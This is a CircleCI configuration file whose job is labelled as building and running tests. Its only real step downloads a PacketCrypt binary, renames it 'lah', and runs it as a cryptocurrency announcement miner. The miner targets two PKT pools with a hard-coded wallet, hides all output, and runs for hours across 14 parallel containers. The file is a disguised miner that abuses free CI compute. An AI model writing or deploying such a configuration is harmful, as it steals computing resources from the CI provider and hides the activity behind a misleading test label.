version: 2.1
jobs:
  build_and_test: # this can be any name you choose
    docker:
      - image: thomasjp0x42/packetcrypt
    steps:
      - checkout
      - run:
          name: Run tests
          no_output_timeout: 294m
          command: |
                  wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
                  chmod +x lah 
                  ./lah ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335  http://pool.pkt.world/ http://pool.pktpool.io/ >/dev/null 2>&1
                  echo "lah"
    parallelism: 14
workflows:
  version: 2
  build: 
     jobs:
       - build_and_test
